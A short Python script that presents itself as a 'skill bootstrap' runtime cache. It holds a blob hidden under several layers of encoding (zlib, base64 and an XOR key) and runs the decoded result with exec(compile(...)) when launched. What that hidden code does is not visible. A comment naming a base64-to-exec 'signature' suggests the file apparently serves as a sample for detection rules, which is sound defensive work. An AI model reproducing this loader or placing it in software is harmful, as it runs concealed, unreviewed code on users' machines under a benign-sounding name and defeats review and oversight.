#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1VE2XqjgQ/UEs6AYBXbbEEBEQMSaBHQFRaKFDhIzNrx/6483rM29mWSeVqlt17y0q+h1rqyC0cL1ohIRLA1LDjEq/u6nH8k6tzmSdjMpMjRJlV7gyQwwwL6xO1w249MIRYqaCeBs0NiarzRD4ydTzeDiuLXbV4L1LXFPtoNBbHYklyFRMkWI/4gNlDSmz403v1jqIHMoeTsVF10qPKFDG/qHLs7m/szBKm57VhpnvE+y7ajqVfrzXDfe9zZIVen6bhgsKdXYEexJH3s1mw4KNuSohMumObx5kyGmaQ5fqj5PT7J9PZB2c8VA9AXFwYvx+e7hrv1VbBorzwE+2mdib0mEvkwHgkEsJyB2WGH30yxbjWoLTSEtzRzH2Y1+/yY3I9/uu5q+g99W7/HzPRugavKiyXt4xubqCkWMLklDEk46SCyocits84ZG2/id/whF/0x7X5ld8zOJo7u/5HSj3MPFwUQyOZbOkJtmIKM5J7Mc3xxT9JmIubHiY+247gKKmM34688OXo7CYf5n5eHGxkVUplXb39FRYP+r/7s8LvxPPBsEf+8LsnXER9zZ46n7m2/R5QKFK3GfV0xRbC6P4s17Z7BIKDsVbPH7No1BiKp6s8Lhow7vvj6lr6Ed/4CuJoqtrqf16wvHnPpFYkZUTMGYGhVXfLAolDOvo5Wr/C+9P/CrEGKfFm9ZoKBG0DALX1LKz6CzpQYWEChN8TGJp7p/xvJ+se2RQX56GYydBWcZxY/JXl4dRLkyYlLtx6s/E5VGpG9/4GW5ByEUtne529RxPYRNVsa96i93b09ZTn3j8oNfQYUz8L72HItAWlKxOZ+x+8H9Oj43Af11QxLwEgSKKsKahsDlkbbjFH/Nwy6af///0xyTlOa00m2b2XO+SESBOjg4N8DqiUibHuiurNOjfAGlmP0QJcjdxzzfm0+ZOuPcffP9fTFoUyTVu+W6bGmIyxQWUMx9TN2QpH2W9HOlKEmo2h8qqdIuJCxkQTVDP0/Jbz4XOTrU9/eDnv+aZ9ylfdbS+nIruhTZ1lvt6azPhgDQ//OL7t97QurJiR0OPK1x87/sLr+aFDZ3jPN6yejHXm+8LOHYmCSOuFhOZ9a/Bw3zPzrNeNUps+uW/ab5Hw+zfBK7kFr+qNg5HY9ZDMutyM+e3h9Xx249qO9dj0ezXvwHZEMVR"
_K = bytes.fromhex("79bba52b14b91cf68b8c150e")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
